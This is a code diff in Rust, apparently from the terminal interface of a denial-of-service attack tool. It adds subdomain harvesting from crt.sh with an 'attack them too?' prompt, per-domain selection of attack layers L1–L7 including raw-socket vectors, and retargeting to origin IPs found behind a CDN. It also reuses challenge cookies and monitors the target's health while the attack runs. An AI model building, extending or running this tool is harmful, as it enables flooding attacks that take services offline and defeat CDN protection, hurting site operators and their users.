@@ -25,6 +25,8 @@ pub enum Phase {
     Running,
     Stopped,
     Subdomains,
+    SubPrompt,
+    Layers,
 }
 
 pub struct SubSel {
@@ -34,7 +36,7 @@ pub struct SubSel {
 }
 
 pub struct ScanOutcome {
-    pub target: Result<Target, String>,
+    pub target: Result<(Target, Vec<bypass::Sub>), String>,
 }
 
 pub struct App {
@@ -44,7 +46,6 @@ pub struct App {
     pub focus: usize,
     pub phase: Phase,
     pub target: Option<Target>,
-    pub selected: [bool; ALL.len()],
     pub cursor: usize,
     pub auto_mode: bool,
     pub stats: Option<Arc<Stats>>,
@@ -65,7 +66,10 @@ pub struct App {
     pub recon: Option<Arc<bypass::Recon>>,
     pub subs: Vec<SubSel>,
     pub sub_cursor: usize,
-    pub extra_targets: Vec<Target>,
+    pub targets: Vec<Target>,
+    pub layers: Vec<u8>,
+    pub layer_domain: usize,
+    pub layer_col: usize,
     samples: VecDeque<(Instant, u64, u64)>,
     scan_rx: Option<mpsc::Receiver<ScanOutcome>>,
     port_rx: Option<mpsc::UnboundedReceiver<u16>>,
@@ -102,7 +106,7 @@ impl App {
             focus: 0,
             phase: Phase::Input,
             target: None,
-            selected: [false; ALL.len()],
+
             cursor: 0,
             auto_mode: true,
             stats: None,
@@ -128,7 +132,10 @@ impl App {
             recon: None,
             subs: Vec::new(),
             sub_cursor: 0,
-            extra_targets: Vec::new(),
+            targets: Vec::new(),
+            layers: Vec::new(),
+            layer_domain: 0,
+            layer_col: 0,
         }
     }
 
@@ -140,49 +147,52 @@ impl App {
         }
     }
 
-    pub fn selected_vectors(&self) -> Vec<Vector> {
+
+    fn layer_bit(layer: &str) -> u8 {
+        match layer {
+            "L1" => 1,
+            "L2" => 2,
+            "L3" => 4,
+            "L4" => 8,
+            "L5" => 16,
+            "L6" => 32,
+            "L7" => 64,
+            _ => 0,
+        }
+    }
+
+    /// Auto-pick layers for one target from its detected service.
+    fn auto_layers_for(&mut self, idx: usize) {
+        let Some(t) = self.targets.get(idx) else { return };
+        let plan = vectors::plan_for(t.service, t.port, self.raw_ok);
+        let mut mask = 0u8;
+        for v in plan {
+            mask |= Self::layer_bit(v.spec().layer);
+        }
+        if let Some(slot) = self.layers.get_mut(idx) {
+            *slot = mask;
+        }
+    }
+
+    fn auto_layers_all(&mut self) {
+        for i in 0..self.targets.len() {
+            self.auto_layers_for(i);
+        }
+    }
+
+    /// Union of the selected layers across all targets.
+    pub fn active_mask(&self) -> u8 {
+        self.layers.iter().fold(0u8, |a, b| a | b)
+    }
+
+    /// Vectors implied by the selected layers for one target.
+    fn vectors_for_domain(&self, idx: usize) -> Vec<Vector> {
+        let mask = self.layers.get(idx).copied().unwrap_or(0);
         ALL.iter()
-            .filter(|s| self.selected[s.vector.index()])
+            .filter(|s| mask & Self::layer_bit(s.layer) != 0)
+            .filter(|s| !s.raw || self.raw_ok)
             .map(|s| s.vector)
             .collect()
-    }
-
-    fn toggle(&mut self, i: usize) {
-        let v = ALL[i].vector;
-        if v.needs_raw() && !self.raw_ok {
-            self.message = format!("{} needs raw sockets (run as root)", v.name());
-            return;
-        }
-        self.selected[i] = !self.selected[i];
-        self.auto_mode = false;
-    }
-
-    fn toggle_layer(&mut self, layer: &str) {
-        let idx: Vec<usize> = ALL
-            .iter()
-            .enumerate()
-            .filter(|(_, s)| s.layer == layer && (!s.raw || self.raw_ok))
-            .map(|(i, _)| i)
-            .collect();
-        if idx.is_empty() {
-            self.message = format!("{layer} unavailable");
-            return;
-        }
-        let any_off = idx.iter().any(|i| !self.selected[*i]);
-        for i in idx {
-            self.selected[i] = any_off;
-        }
-        self.auto_mode = false;
-        self.message = format!("{layer} {}", if any_off { "armed" } else { "cleared" });
-    }
-
-    fn apply_plan(&mut self) {
-        let Some(t) = &self.target else { return };
-        let plan = vectors::plan_for(t.service, t.port, self.raw_ok);
-        self.selected = [false; ALL.len()];
-        for v in &plan {
-            self.selected[v.index()] = true;
-        }
     }
 
     pub fn start_scan(&mut self) {
@@ -223,6 +233,15 @@ impl App {
             let res = async {
                 t.resolve()?;
                 let ip = t.primary().ok_or("target has no address")?;
+                // Subdomains are always loaded first, before any port work.
+                let names = bypass::crt_sh(&t.host).await;
+                let subs = if names.is_empty() {
+                    Vec::new()
+                } else {
+                    let mut n = names;
+                    n.truncate(200);
+                    bypass::verify_subs(n).await
+                };
                 if t.port.is_none() {
                     let progress = Arc::new(AtomicU32::new(0));
                     let ports = target::scan_all_ports(ip, ptx, progress).await;
@@ -238,7 +257,7 @@ impl App {
                 } else {
                     target::fingerprint(&mut t)?;
                 }
-                Ok::<Target, String>(t)
+                Ok::<(Target, Vec<bypass::Sub>), String>((t, subs))
             }
             .await;
             let _ = tx.send(ScanOutcome { target: res }).await;
@@ -262,7 +281,7 @@ impl App {
         self.scan_rx = None;
         self.port_rx = None;
         match out.target {
-            Ok(t) => {
+            Ok((t, subs)) => {
                 let ips = t
                     .ips
                     .iter()
@@ -279,26 +298,41 @@ impl App {
                         .join(",")
                 };
                 self.note(format!(
-                    "target {} -> {} | service: {} | port {} | open: {}",
+                    "target {} -> {} | service: {} | port {} | open: {} | {} subdomains",
                     t.input,
                     ips,
                     t.service.label(),
                     t.port.map(|p| p.to_string()).unwrap_or_else(|| "-".into()),
-                    ports
+                    ports,
+                    subs.len()
                 ));
                 self.target = Some(t);
-                if self.auto_mode {
-                    self.apply_plan();
-                } else if self.selected_vectors().is_empty() {
-                    self.apply_plan();
+                self.targets = self.target.iter().cloned().collect();
+                self.layers = vec![0u8];
+                self.layer_domain = 0;
+                self.layer_col = 0;
+                self.subs = subs
+                    .iter()
+                    .map(|s| SubSel {
+                        name: s.name.clone(),
+                        ips: s.ips.clone(),
+                        selected: false,
+                    })
+                    .collect();
+                self.sub_cursor = 0;
+
+                if self.subs.is_empty() {
+                    self.auto_layers_all();
+                    self.phase = Phase::Layers;
+                    self.message =
+                        "no subdomains - choose layers, Enter to start".into();
+                } else {
+                    self.phase = Phase::SubPrompt;
+                    self.message = format!(
+                        "{} subdomains found - attack them too? [y/N]",
+                        self.subs.len()
+                    );
                 }
-                let n = self.selected_vectors().len();
-                self.message = format!(
-                    "{} vectors armed ({}) - Enter to start",
-                    n,
-                    if self.auto_mode { "auto" } else { "manual" }
-                );
-                self.phase = Phase::Ready;
 
                 // Recon runs after the target is known: CDN detection, origin
                 // discovery and challenge handling.
@@ -332,25 +366,7 @@ impl App {
         };
         self.recon_rx = None;
         self.note(format!("recon: {}", bypass::summary(&r)));
-        let has_subs = !r.subs.is_empty();
-        self.subs = r
-            .subs
-            .iter()
-            .map(|s| SubSel {
-                name: s.name.clone(),
-                ips: s.ips.clone(),
-                selected: false,
-            })
-            .collect();
-        self.sub_cursor = 0;
         self.recon = Some(Arc::new(r));
-        if has_subs && self.phase == Phase::Ready {
-            self.phase = Phase::Subdomains;
-            self.message = format!(
-                "{} subdomains found - Space select, Enter confirm, Esc skip",
-                self.subs.len()
-            );
-        }
     }
 
     pub fn begin_attack(&mut self) {
@@ -358,15 +374,16 @@ impl App {
             self.message = "scan a target first".into();
             return;
         };
-        let vectors = self.selected_vectors();
-        if vectors.is_empty() {
-            self.message = "no vectors selected".into();
-            return;
+        if self.targets.is_empty() {
+            self.targets = vec![t.clone()];
+            self.layers = vec![0u8];
+            self.auto_layers_all();
         }
         let Some(ip) = t.primary() else {
             self.message = "target has no address".into();
             return;
         };
+        let default_port = t.port.unwrap_or(if t.tls { 443 } else { 80 });
 
         let stats = Arc::new(Stats::new());
         let raw = if self.raw_ok {
@@ -377,12 +394,6 @@ impl App {
         } else {
             None
         };
-        let port = t.port.unwrap_or_else(|| {
-            vectors
-                .first()
-                .map(|v| vectors::default_port(*v))
-                .unwrap_or(80)
-        });
 
         let budgets: Vec<Arc<attack::Budget>> = ALL
             .iter()
@@ -391,12 +402,20 @@ impl App {
         attack::spawn_refill(budgets.clone(), stats.clone());
         let cookie = self.recon.as_ref().and_then(|r| r.cookie.clone());
 
-        let mut targets: Vec<(Target, u16)> = vec![(t.clone(), port)];
-        for e in &self.extra_targets {
-            targets.push((e.clone(), e.port.unwrap_or(port)));
-        }
-        let n_targets = targets.len();
-        for (tg, tp) in targets {
+        let mut launched = 0usize;
+        let mut total_vectors = 0usize;
+        for idx in 0..self.targets.len() {
+            let vectors = self.vectors_for_domain(idx);
+            if vectors.is_empty() {
+                continue;
+            }
+            let tg = self.targets[idx].clone();
+            let tp = tg.port.unwrap_or_else(|| {
+                vectors
+                    .first()
+                    .map(|v| vectors::default_port(*v))
+                    .unwrap_or(default_port)
+            });
             let ctx = Arc::new(Ctx {
                 target: tg,
                 port: tp,
@@ -407,18 +426,22 @@ impl App {
                 budgets: budgets.clone(),
             });
             attack::launch(ctx, vectors.clone());
+            launched += 1;
+            total_vectors += vectors.len();
+        }
+        if launched == 0 {
+            self.message = "no layers selected".into();
+            return;
         }
 
         let h = Arc::new(Health::new());
         let stop = Arc::new(AtomicBool::new(false));
-        health::spawn(h.clone(), ip, port, stop.clone());
+        health::spawn(h.clone(), ip, default_port, stop.clone());
         self.health = Some(h);
         self.health_stop = Some(stop);
 
         self.note(format!(
-            "attacking {ip}:{port} with {} vectors on {} target(s){}",
-            vectors.len(),
-            n_targets,
+            "attacking {ip}:{default_port} with {total_vectors} vectors on {launched} target(s){}",
             if self.limit_secs > 0 {
                 format!(" for {}m", self.limit_secs / 60)
             } else {
@@ -495,6 +518,86 @@ impl App {
             Phase::Running => self.key_running(k),
             Phase::Stopped => self.key_stopped(k),
             Phase::Subdomains => self.key_subs(k),
+            Phase::SubPrompt => self.key_subprompt(k),
+            Phase::Layers => self.key_layers(k),
+        }
+    }
+
+    fn key_subprompt(&mut self, k: KeyEvent) {
+        match k.code {
+            KeyCode::Char('y') | KeyCode::Char('Y') | KeyCode::Enter => {
+                if self.subs.is_empty() {
+                    self.to_layers();
+                } else {
+                    self.phase = Phase::Subdomains;
+                    self.message =
+                        "Space select, a all, Enter confirm, Esc skip".into();
+                }
+            }
+            KeyCode::Char('n') | KeyCode::Char('N') | KeyCode::Esc => {
+                self.subs.clear();
+                self.to_layers();
+            }
+            _ => {}
+        }
+    }
+
+    fn to_layers(&mut self) {
+        self.targets = self.target.iter().cloned().collect();
+        self.layers = vec![0u8; self.targets.len()];
+        self.layer_domain = 0;
+        self.layer_col = 0;
+        self.auto_layers_all();
+        self.phase = Phase::Layers;
+        self.message = "Up/Down domain, Left/Right layer, Space toggle, a auto, s all, Enter start".into();
+    }
+
+    fn key_layers(&mut self, k: KeyEvent) {
+        let n = self.targets.len();
+        match k.code {
+            KeyCode::Up => self.layer_domain = self.layer_domain.saturating_sub(1),
+            KeyCode::Down => {
+                if n > 0 {
+                    self.layer_domain = (self.layer_domain + 1).min(n - 1);
+                }
+            }
+            KeyCode::Left => self.layer_col = self.layer_col.saturating_sub(1),
+            KeyCode::Right => self.layer_col = (self.layer_col + 1).min(6),
+            KeyCode::Char(' ') => {
+                let bit = 1u8 << self.layer_col;
+                if let Some(m) = self.layers.get_mut(self.layer_domain) {
+                    *m ^= bit;
+                }
+            }
+            KeyCode::Char('a') => {
+                self.auto_layers_all();
+                self.message = "auto layers for every domain".into();
+            }
+            KeyCode::Char('s') => {
+                for m in &mut self.layers {
+                    *m = 0x7f;
+                }
+                self.message = "all layers armed".into();
+            }
+            KeyCode::Char('n') => {
+                for m in &mut self.layers {
+                    *m = 0;
+                }
+                self.message = "all layers cleared".into();
+            }
+            KeyCode::Enter => {
+                if self.layers.iter().any(|m| *m != 0) {
+                    self.phase = Phase::Ready;
+                    self.message = "Enter to start, Esc back to layers".into();
+                } else {
+                    self.message = "no layers selected".into();
+                }
+            }
+            KeyCode::Esc => {
+                self.phase = Phase::Input;
+                self.focus = 0;
+            }
+            _ => {}
         }
     }
 
@@ -518,29 +621,29 @@ impl App {
                 }
             }
             KeyCode::Enter => {
-                self.extra_targets = self
-                    .subs
-                    .iter()
-                    .filter(|s| s.selected)
-                    .filter_map(|s| {
-                        let mut t = self.target.clone()?;
+                let mut targets: Vec<Target> = self.target.iter().cloned().collect();
+                for s in self.subs.iter().filter(|s| s.selected) {
+                    if let Some(mut t) = self.target.clone() {
                         t.host = s.name.clone();
                         t.ips = s.ips.clone();
-                        Some(t)
-                    })
-                    .collect();
-                let n = self.extra_targets.len();
-                self.phase = Phase::Ready;
-                self.message = if n > 0 {
-                    format!("{n} extra subdomains will also be hit - Enter to start")
-                } else {
-                    "primary target only - Enter to start".into()
-                };
+                        t.service = target::classify_port(t.port.unwrap_or(80));
+                        targets.push(t);
+                    }
+                }
+                self.targets = targets;
+                self.layers = vec![0u8; self.targets.len()];
+                self.layer_domain = 0;
+                self.layer_col = 0;
+                self.auto_layers_all();
+                self.phase = Phase::Layers;
+                self.message = format!(
+                    "{} domains - Up/Down, Left/Right layer, Space toggle, a auto, s all, Enter start",
+                    self.targets.len()
+                );
             }
             KeyCode::Esc => {
-                self.extra_targets.clear();
-                self.phase = Phase::Ready;
-                self.message = "primary target only - Enter to start".into();
+                self.subs.clear();
+                self.to_layers();
             }
             _ => {}
         }
@@ -594,45 +697,19 @@ impl App {
 
     fn key_ready(&mut self, k: KeyEvent) {
         match k.code {
-            KeyCode::Up => self.cursor = self.cursor.saturating_sub(1),
-            KeyCode::Down => self.cursor = (self.cursor + 1).min(ALL.len() - 1),
-            KeyCode::Char(' ') => self.toggle(self.cursor),
             KeyCode::Enter => self.begin_attack(),
             KeyCode::Esc => {
-                self.phase = Phase::Input;
-                self.focus = 0;
-                self.message = "edit target and press Enter to rescan".into();
-            }
-            KeyCode::Char('a') => {
-                for i in 0..ALL.len() {
-                    if !ALL[i].raw || self.raw_ok {
-                        self.selected[i] = true;
-                    }
-                }
-                self.auto_mode = false;
-            }
-            KeyCode::Char('n') => {
-                self.selected = [false; ALL.len()];
-                self.auto_mode = false;
-            }
-            KeyCode::Char('m') => {
-                self.auto_mode = !self.auto_mode;
-                if self.auto_mode {
-                    self.apply_plan();
-                    self.message = "auto layer selection".into();
-                } else {
-                    self.message = "manual layer selection".into();
-                }
-            }
-            KeyCode::Char(c @ '1'..='7') => {
-                let layer = format!("L{c}");
-                self.toggle_layer(&layer);
+                self.phase = Phase::Layers;
+                self.message = "Up/Down domain, Left/Right layer, Space toggle".into();
             }
             KeyCode::Char('o') => {
                 let ip = self.recon.as_ref().and_then(|r| r.origins.first().copied());
                 match ip {
                     Some(ip) => {
                         if let Some(t) = self.target.as_mut() {
+                            t.ips = vec![ip];
+                        }
+                        if let Some(t) = self.targets.first_mut() {
                             t.ips = vec![ip];
                         }
                         self.note(format!("retargeted to origin {ip}"));
